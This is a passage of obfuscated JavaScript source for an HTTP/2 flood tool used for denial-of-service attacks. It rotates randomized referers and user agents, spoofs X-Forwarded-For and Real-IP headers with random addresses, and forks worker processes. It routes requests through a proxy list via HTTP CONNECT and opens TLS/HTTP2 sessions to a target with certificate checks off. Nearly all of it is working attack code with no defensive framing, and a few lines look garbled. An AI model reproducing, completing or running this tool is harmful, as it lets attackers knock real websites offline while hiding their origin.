"https://www.google.ae/search?q=", "https://www.google.al/search?q=", "https://www.google.co.ao/search?q=", 'https://www.google.com.af/search?q=', "https://www.google.com.ag/search?q=", 'https://www.google.com.ai/search?q=', 'https://www.google.com/search?q=', "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=", "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=", "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=", "https://www.npmjs.com/search?q=", "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=", "https://www.pinterest.com/search/?q=", "https://www.qwant.com/search?q=", "https://www.ted.com/search?q=", "https://www.usatoday.com/search/results?q=", "https://www.yandex.com/yandsearch?text=", "https://www.youtube.com/", "https://yandex.ru/", "http://anonymouse.org/cgi-bin/anon-www.cgi/", "http://coccoc.com/search#query=", "http://ddosvn.somee.com/f5.php?v=", "http://engadget.search.aol.com/search?q=", 'http://engadget.search.aol.com/search?q=query?=query=&q=', "http://eu.battle.net/wow/en/search?q=", "http://filehippo.com/search?q=", 'http://funnymama.com/search?q=', 'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=', "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/", "http://go.mail.ru/search?mail.ru=1&q=", "http://help.baidu.com/searchResult?keywords=", "http://host-tracker.com/check_page/?furl=", "http://itch.io/search?q=", "http://jigsaw.w3.org/css-validator/validator?uri=", "http://jobs.bloomberg.com/search?q=", "http://jobs.leidos.com/search?q=", "http://jobs.rbs.com/jobs/search?q=", "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://louis-ddosvn.rhcloud.com/f5.html?v=", "http://millercenter.org/search?q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/", "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=", "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/", "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=", "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=", "http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/", "http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=", "http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/", "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=", "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/", 'http://search.aol.com/aol/search?q=', "http://taginfo.openstreetmap.org/search?q=", "http://techtv.mit.edu/search?q=", "http://validator.w3.org/feed/check.cgi?url=", "http://vk.com/profile.php?redirect=", 'http://www.ask.com/web?q=', "http://www.baoxaydung.com.vn/news/vn/search&q=", "http://www.bestbuytheater.com/events/search?q=", "http://www.bing.com/search?q=", "http://www.evidence.nhs.uk/search?q=", "http://www.google.com/?q=", "http://www.google.com/translate?u=", "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=", "http://www.google.ru/url?sa=t&rct=?j&q=&e/", "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", 'http://www.pagescoring.com/website-speed-test/?url=', "http://www.reddit.com/search?q=", "http://www.search.com/search?q=", 'http://www.shodanhq.com/search?q=', 'http://www.ted.com/search?q=', "http://www.topsiteminecraft.com/site/pinterest.com/search?q=", "http://www.usatoday.com/search/results?q=", "http://www.ustream.tv/search?q=", "http://yandex.ru/yandsearch?text=", "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", "http://ytmnd.com/search?q=", "https://add.my.yahoo.com/rss?url=", "https://careers.carolinashealthcare.org/search?q=", "https://check-host.net/", "https://developers.google.com/speed/pagespeed/insights/?url=", "https://drive.google.com/viewerng/viewer?url=", "https://duckduckgo.com/?q=", "https://google.com/", "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=", "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=", "https://help.baidu.com/searchResult?keywords=", "https://play.google.com/store/search?q=", "https://pornhub.com/", "https://r.search.yahoo.com/", "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", "https://steamcommunity.com/market/search?q=", "https://vk.com/profile.php?redirect=", "https://www.bing.com/search?q=", "https://www.cia.gov/index.html", "https://www.facebook.com/", 'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=', 'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=', "https://www.fbi.com/", "https://www.google.ad/search?q=", "https://www.google.ae/search?q=", "https://www.google.al/search?q=", "https://www.google.co.ao/search?q=", "https://www.google.com.af/search?q=", "https://www.google.com.ag/search?q=", 'https://www.google.com.ai/search?q=', "https://www.google.com/search?q=", "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=", 'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=', 'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=', "https://www.npmjs.com/search?q=", "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=", "https://www.pinterest.com/search/?q=", "https://www.qwant.com/search?q=", "https://www.ted.com/search?q=", "https://www.usatoday.com/search/results?q=", "https://www.yandex.com/yandsearch?text=", "https://www.youtube.com/", "https://yandex.ru/", 'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D'];
var randomReferer = refers[Math.floor(Math.random() * refers.length)];
let concu = sigalgs.join(':');
const uap = ["POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1", "POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1", "portalmmm/2.0 N410i(c20;TB) ", "Python-urllib/2.5", "SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3", "SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)", "SearchExpress", "SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)", "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0", "SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0", "SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT100/R101", "Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00", "Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00", "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10", "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01", "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10", "Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30", "SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0", "SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonT68/R201A", "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1", "SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]", "SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0", "SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0", "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102", "BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0", "BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123", "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0", "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36", "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"];
const ip_spoof = () => {
  return Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
};
var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
const fakeIP = Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
var queryString = queryStrings[Math.floor(Math.random() * queryStrings.length)];
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
  for (let counter = 0x1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else {
  setInterval(runFlooder);
}
class NetSocket {
  constructor() {}
  ["HTTP"](_0x13b64f, _0x3b64c5) {
    const _0x97ac69 = "CONNECT " + _0x13b64f.address + ":443 HTTP/1.1\r\nHost: " + _0x13b64f.address + ":443\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n";
    const _0x46d4aa = new Buffer.from(_0x97ac69);
    const _0x4de37e = net.connect({
      'host': _0x13b64f.host,
      'port': _0x13b64f.port
    });
    _0x4de37e.setTimeout(_0x13b64f.timeout * 0x2710);
    _0x4de37e.setKeepAlive(true, 0x186a0);
    _0x4de37e.on("connect", () => {
      _0x4de37e.write(_0x46d4aa);
    });
    _0x4de37e.on("data", _0x47dd8b => {
      const _0x3063d0 = _0x47dd8b.toString('utf-8');
      const _0x47fef6 = _0x3063d0.includes("HTTP/1.1 200");
      if (_0x47fef6 === false) {
        _0x4de37e.destroy();
        return _0x3b64c5(undefined, "error: invalid response from proxy server");
      }
      return _0x3b64c5(_0x4de37e, undefined);
    });
    _0x4de37e.on("timeout", () => {
      _0x4de37e.destroy();
      return _0x3b64c5(undefined, "error: timeout exceeded");
    });
    _0x4de37e.on('error', _0x5a5f62 => {
      _0x4de37e.destroy();
      return _0x3b64c5(undefined, "error: " + _0x5a5f62);
    });
  }
}
const Socker = new NetSocket();
headers[':method'] = randomMethod;
headers[':path'] = parsedTarget.path + pathts[Math.floor(Math.random() * pathts.length)] + '&' + randomString(0xa) + queryString + randomString(0xa);
headers.origin = parsedTarget.host;
headers["Content-Type"] = randomHeaders["Content-Type"];
headers[":scheme"] = 'https';
headers["x-download-options"] = randomHeaders['x-download-options'];
headers["Cross-Origin-Embedder-Policy"] = randomHeaders["Cross-Origin-Embedder-Policy"];
headers["Cross-Origin-Opener-Policy"] = randomHeaders["Cross-Origin-Opener-Policy"];
headers.accept = randomHeaders.accept;
headers["accept-language"] = randomHeaders["accept-language"];
headers['Referrer-Policy'] = randomHeaders["Referrer-Policy"];
headers["x-cache"] = randomHeaders['x-cache'];
headers["Content-Security-Policy"] = randomHeaders["Content-Security-Policy"];
headers["accept-encoding"] = randomHeaders["accept-encoding"];
headers["cache-control"] = randomHeaders["cache-control"];
headers['x-frame-options'] = randomHeaders['x-frame-options'];
headers["x-xss-protection"] = randomHeaders["x-xss-protection"];
headers["x-content-type-options"] = "nosniff";
headers.TE = "trailers";
headers.pragma = randomHeaders.pragma;
headers["sec-ch-ua-platform"] = randomHeaders["sec-ch-ua-platform"];
headers['upgrade-insecure-requests'] = '1';
headers['sec-fetch-dest'] = randomHeaders["sec-fetch-dest"];
headers["sec-fetch-mode"] = randomHeaders["sec-fetch-mode"];
headers["sec-fetch-site"] = randomHeaders["sec-fetch-site"];
headers["X-Forwarded-Proto"] = HTTPS;
headers['sec-ch-ua'] = randomHeaders["sec-ch-ua"];
headers["sec-ch-ua-mobile"] = randomHeaders["sec-ch-ua-mobile"];
headers['sec-ch-ua-platform'] = randomHeaders["sec-ch-ua-platform"];
headers.vary = randomHeaders.vary;
headers["x-requested-with"] = "XMLHttpRequest";
headers.TE = trailers;
headers['set-cookie'] = randomHeaders["set-cookie"];
headers.Server = randomHeaders.Server;
headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
headers["access-control-allow-headers"] = randomHeaders["access-control-allow-headers"];
headers['access-control-allow-origin'] = randomHeaders["access-control-allow-origin"];
headers["Content-Encoding"] = randomHeaders["Content-Encoding"];
headers["alt-svc"] = randomHeaders["alt-svc"];
headers.Via = fakeIP;
headers.sss = fakeIP;
headers["Sec-Websocket-Key"] = fakeIP;
headers['Sec-Websocket-Version'] = 0xd;
headers.Upgrade = websocket;
headers["X-Forwarded-For"] = fakeIP;
headers["X-Forwarded-Host"] = fakeIP;
headers["Client-IP"] = fakeIP;
headers["Real-IP"] = fakeIP;
headers.Referer = randomReferer;
function runFlooder() {
  const _0x1b2eaa = proxyFile[Math.floor(Math.random() * (proxyFile.length - 0x0) + 0x0)];
  const _0x1f9742 = _0x1b2eaa.split(':');
  var _0x15342f = uap[Math.floor(Math.floor(Math.random() * uap.length))];
  headers[":authority"] = parsedTarget.host;
  headers["user-agent"] = _0x15342f;
  const _0x1005e7 = {
    'host': _0x1f9742[0x0],
    'port': ~~_0x1f9742[0x1],
    'address': parsedTarget.host + ":443",
    'timeout': 0x19
  };
  setTimeout(function () {
    process.exit(0x1);
  }, process.argv[0x3] * 0x3e8);
  process.on("uncaughtException", function (_0x3050dc) {});
  process.on("unhandledRejection", function (_0x177652) {});
  Socker.HTTP(_0x1005e7, (_0x122912, _0x1ba8a3) => {
    if (_0x1ba8a3) {
      return;
    }
    _0x122912.setKeepAlive(true, 0x186a0);
    const _0x3b521e = {
      'ALPNProtocols': ['h2'],
      'challengesToSolve': Infinity,
      'resolveWithFullResponse': true,
      'followAllRedirects': true,
      'maxRedirects': 0xa,
      'clientTimeout': 0x1388,
      'clientlareMaxTimeout': 0x2710,
      'cloudflareTimeout': 0x1388,
      'cloudflareMaxTimeout': 0x7530,
      'ciphers': tls.getCiphers().join(':') + cipper,
      'secureProtocol': ['TLSv1_1_method', "TLSv1_2_method", "TLSv1_3_method"],
      'servername': url.hostname,
      'socket': _0x122912,
      'honorCipherOrder': true,
      'secureOptions': crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
      'sigals': concu,
      'echdCurve': 'GREASE:X25519:x25519:P-256:P-384:P-521:X448',
      'secure': true,
      'Compression': false,
      'rejectUnauthorized': false,
      'port': 0x1bb,
      'uri': parsedTarget.host,
      'servername': parsedTarget.host,
      'sessionTimeout': 0x1388
    };
    const _0x56bc19 = tls.connect(0x1bb, parsedTarget.host, _0x3b521e);
    _0x56bc19.setKeepAlive(true, 600000);
    const _0x315abf = http2.connect(parsedTarget.href, {
      'protocol': "https:",
      'settings': {
        'headerTableSize': 0x10000,
        'maxConcurrentStreams': 0x3e8,
        'initialWindowSize': 0x600000,
        'maxHeaderListSize': 0x40000,
        'enablePush': false
      },
      'maxSessionMemory': 0xfa00,
      'maxDeflateDynamicTableSize': 0xffffffff,
      'createConnection': () => _0x56bc19,
      'socket': _0x122912
    });
    _0x315abf.settings({
      'headerTableSize': 0x10000,
      'maxConcurrentStreams': 0x4e20,
      'initialWindowSize': 0x600000,
      'maxHeaderListSize': 0x40000,
      'enablePush': false
    });
    _0x315abf.on('connect', () => {});
    _0x315abf.on("close", () => {
      _0x315abf.destroy();
      _0x122912.destroy();
      return;
    });
    _0x315abf.on("error", _0x246b29 => {
      _0x315abf.destroy();
      _0x122912.destroy();
      return;
    });
  });
}